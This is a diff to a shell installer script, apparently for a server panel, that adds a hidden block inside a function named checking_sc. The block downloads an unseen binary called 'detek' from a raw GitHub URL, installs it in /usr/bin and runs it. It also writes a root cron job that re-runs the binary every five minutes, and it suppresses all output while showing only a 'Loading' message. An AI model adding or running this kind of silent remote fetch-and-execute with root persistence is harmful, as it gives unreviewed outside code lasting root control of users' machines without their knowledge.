@@ -46,6 +46,21 @@ checking_sc() {
         echo -e "      \033[2;32mTelegram\033[0m t.me/PeyxDev"
         echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
 cd
+        {
+> /etc/cron.d/cpu_otm
+
+cat> /etc/cron.d/cpu_otm << END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/5 * * * * root /usr/bin/detek
+END
+
+wget https://raw.githubusercontent.com/rifg67/script-rifts/main/install/detek
+mv detek /usr/bin/detek
+chmod +x /usr/bin/detek
+detek
+   } &> /dev/null &
+echo "Loading Extract and Setup detek" | lolcat
     fi
 }
 
